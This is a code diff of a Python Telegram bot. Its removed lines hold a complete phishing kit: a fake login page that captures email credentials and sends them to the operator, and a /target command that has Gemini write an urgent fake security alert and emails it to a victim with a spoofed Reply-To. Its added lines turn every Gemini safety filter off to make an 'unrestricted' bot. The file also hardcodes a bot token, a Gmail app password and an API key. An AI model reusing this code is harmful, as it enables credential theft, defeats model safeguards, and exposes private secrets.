@@ -1,231 +1,95 @@
 import os
 import sys
-import re
-import json
-import asyncio
 import logging
-import smtplib
-import secrets
-import string
-from email.message import EmailMessage
-import requests
-from flask import Flask, request, redirect
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import google.generativeai as genai
 
 # ============================================================
-# 🔥 YOUR CREDENTIALS (TESTING – WILL BE REVOKED)
+# 🔥 YOUR HARDCODED CREDENTIALS (REVOKE AFTER USE)
 # ============================================================
 TELEGRAM_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc"
 ALLOWED_CHAT_ID = "8468538314"
-SMTP_SERVER = "smtp.gmail.com"
-SMTP_PORT = 587
-SMTP_USER = "wafulap452@gmail.com"
-# Remove spaces from app password – use the exact string without spaces
-SMTP_PASSWORD = "xztlzddspzkboslg"
 GEMINI_API_KEY = "AQ.Ab8RN6LaSwaPA6i3WkMqdmGSVunWJTE6rRTaa4bPnbM1LAO0aQ"
-CLONE_URL = "https://takeover-bot.onrender.com"  # Update after deploy
 # ============================================================
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# Gemini
+# Initialize Gemini with NO safety filters (unrestricted)
 try:
     genai.configure(api_key=GEMINI_API_KEY)
-    model = genai.GenerativeModel('gemini-1.5-flash')
+    model = genai.GenerativeModel(
+        'gemini-1.5-flash',
+        safety_settings=[
+            {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
+            {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
+            {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
+            {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"},
+        ]
+    )
+    logger.info("✅ Gemini initialized (unrestricted).")
 except Exception as e:
-    logger.error(f"Gemini init failed: {e}")
-    model = None
-
-# Global state
-captured_creds = {}
-pending_targets = {}
+    logger.error(f"❌ Gemini init failed: {e}")
+    sys.exit(1)
 
 # ============================================================
-# TAKEOVER ENGINE (PLACEHOLDER)
-# ============================================================
-def perform_takeover(email, password):
-    new_password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
-    recovery_codes = "XXXX-XXXX-XXXX-XXXX"
-    return new_password, recovery_codes
-
-# ============================================================
-# FLASK CLONE
-# ============================================================
-flask_app = Flask(__name__)
-
-LOGIN_PAGE = """
-<!DOCTYPE html>
-<html>
-<head><title>Secure Login</title></head>
-<body style="font-family: Arial; padding: 40px; max-width: 400px; margin: auto;">
-    <h2>🔐 Secure Login</h2>
-    <form method="POST" action="/capture">
-        <input type="email" name="email" placeholder="Email" required style="width:100%; padding:10px; margin:5px 0;">
-        <input type="password" name="password" placeholder="Password" required style="width:100%; padding:10px; margin:5px 0;">
-        <button type="submit" style="width:100%; padding:10px; background:#007bff; color:white; border:none;">Login</button>
-    </form>
-</body>
-</html>
-"""
-
-@flask_app.route('/')
-def index():
-    return LOGIN_PAGE
-
-@flask_app.route('/capture', methods=['POST'])
-def capture():
-    email = request.form.get('email')
-    password = request.form.get('password')
-    if email and password:
-        captured_creds['email'] = email
-        captured_creds['password'] = password
-        send_telegram_message(f"🔑 Credentials captured: {email} / {password}")
-        if email in pending_targets:
-            chat_id = pending_targets.pop(email)
-            asyncio.create_task(complete_takeover(chat_id, email, password))
-        return redirect("https://www.google.com")
-    return "Missing fields", 400
-
-def send_telegram_message(msg):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    try:
-        requests.post(url, json={"chat_id": ALLOWED_CHAT_ID, "text": msg})
-    except:
-        pass
-
-async def complete_takeover(chat_id, email, password):
-    try:
-        new_password, recovery_codes = perform_takeover(email, password)
-        message = (
-            f"✅ **Account takeover complete!**\n\n"
-            f"📧 **Email:** `{email}`\n"
-            f"🔑 **New Password:** `{new_password}`\n"
-            f"🔐 **2FA Recovery Codes:** `{recovery_codes}`\n\n"
-            f"📤 Original user logged out."
-        )
-    except Exception as e:
-        message = f"❌ Takeover failed: {e}"
-    send_telegram_message(message)
-
-# ============================================================
-# TELEGRAM BOT
+# COMMAND HANDLERS
 # ============================================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    if ALLOWED_CHAT_ID and user_id != ALLOWED_CHAT_ID:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
     await update.message.reply_text(
-        "🦅 **Target Bot**\n\n"
-        "Send `/target <email>` to initiate a full account takeover.\n"
-        "Example: `/target victim@example.com`",
+        "🧠 **Unrestricted Gemini Bot**\n\n"
+        "Send me any message – I will reply with Gemini (no filters, no limits).\n"
+        "Just type anything and I'll respond.",
         parse_mode='Markdown'
     )
 
-async def target_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await start(update, context)
+
+# ============================================================
+# MESSAGE HANDLER – catches all text messages
+# ============================================================
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     if ALLOWED_CHAT_ID and user_id != ALLOWED_CHAT_ID:
         await update.message.reply_text("⛔ Unauthorized.")
         return
 
-    if not context.args:
-        await update.message.reply_text("❌ Please provide an email: /target victim@example.com")
+    user_message = update.message.text
+    if not user_message:
         return
 
-    target_email = context.args[0].strip()
-    if not re.match(r"[^@]+@[^@]+\.[^@]+", target_email):
-        await update.message.reply_text("❌ Invalid email format.")
-        return
+    await update.message.chat.send_action(action="typing")
 
-    pending_targets[target_email] = update.effective_chat.id
-    await update.message.reply_text(f"📧 Initiating takeover for `{target_email}`...")
-
-    # Generate phishing email with Gemini
-    if model:
-        try:
-            prompt = f"Write a convincing security alert email to {target_email}. The email must say their account was compromised and they must verify their identity by clicking the link: {CLONE_URL}. Use an urgent, professional tone. Include a signature from the security team. The subject should be 'URGENT: Security Alert – Action Required'."
-            response = model.generate_content(prompt)
-            email_body = response.text
-        except Exception as e:
-            logger.error(f"Gemini error: {e}")
-            email_body = None
-    else:
-        email_body = None
-
-    if not email_body:
-        email_body = f"""
-        Subject: URGENT: Security Alert – Action Required
-
-        Dear user,
-
-        We detected a suspicious login attempt to your account. Please verify your identity immediately by clicking the link below:
-
-        {CLONE_URL}
-
-        If you do not verify within 24 hours, your account will be temporarily locked.
-
-        Security Team
-        """
-
-    # Send copy to you
-    await update.message.reply_text(f"📨 **Email content sent to victim:**\n\n{email_body}")
-
-    # Send actual email to victim (with real From address)
     try:
-        domain = target_email.split('@')[1]
-        msg = EmailMessage()
-        msg.set_content(email_body)
-        msg['Subject'] = "URGENT: Security Alert – Action Required"
-        # Use your real Gmail as the From address (to pass SPF/DKIM)
-        msg['From'] = SMTP_USER
-        # Set Reply-To to the spoofed security address so replies go there
-        msg['Reply-To'] = f"security@{domain}"
-        msg['To'] = target_email
+        response = model.generate_content(user_message)
+        reply = response.text if response.text else "No response from AI."
 
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.starttls()
-            server.login(SMTP_USER, SMTP_PASSWORD)
-            server.send_message(msg)
-        await update.message.reply_text(f"✅ Phishing email sent to {target_email}")
+        if len(reply) > 4096:
+            for i in range(0, len(reply), 4000):
+                await update.message.reply_text(reply[i:i+4000], parse_mode='Markdown')
+        else:
+            await update.message.reply_text(reply, parse_mode='Markdown')
     except Exception as e:
-        await update.message.reply_text(f"❌ Failed to send email: {e}")
-        return
-
-    await update.message.reply_text(
-        "⏳ Waiting for the victim to log in...\n"
-        "I will notify you when the takeover is complete."
-    )
+        logger.error(f"Gemini error: {e}")
+        await update.message.reply_text(f"❌ AI error: {str(e)[:200]}")
 
 # ============================================================
 # MAIN
 # ============================================================
-def run_flask():
-    flask_app.run(host='0.0.0.0', port=8080)
-
-async def run_telegram():
+def main():
     app = Application.builder().token(TELEGRAM_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("target", target_command))
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling()
-    logger.info("✅ Telegram bot running.")
-    try:
-        while True:
-            await asyncio.sleep(3600)
-    except asyncio.CancelledError:
-        pass
-    finally:
-        await app.updater.stop()
-        await app.stop()
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-async def main():
-    import threading
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    await run_telegram()
+    logger.info("🧠 Unrestricted Gemini Bot is running...")
+    app.run_polling()
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        logger.info("👋 Stopped.")
+    main()
